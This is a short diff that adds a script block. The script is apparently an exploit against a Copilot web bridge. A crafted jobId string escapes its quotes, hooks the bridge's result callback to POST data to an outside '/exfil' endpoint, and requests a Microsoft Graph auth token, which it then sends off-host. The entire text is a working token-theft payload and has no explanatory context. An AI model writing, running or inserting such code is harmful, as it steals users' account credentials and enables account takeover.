@@ -1,0 +1,8 @@
+<script>
+var jobId = "x');" +
+"window.copilotBridge.notifyResultReady=function(j){" +
+"fetch('https://suadhikar244.dssldrf.net/exfil',{method:'POST',mode:'no-cors',body:window._copilotBridge.getResult(j)})};" +
+"window._copilotBridge.send('getAuthToken','t'," +
+"JSON.stringify({scope:'https://graph.microsoft.com/.default',refresh:false,accountType:'MSA'}));//";
+setTimeout(function(){ window._copilotBridge.send("supportedApi", jobId, "{}"); }, 2500);
+</script>
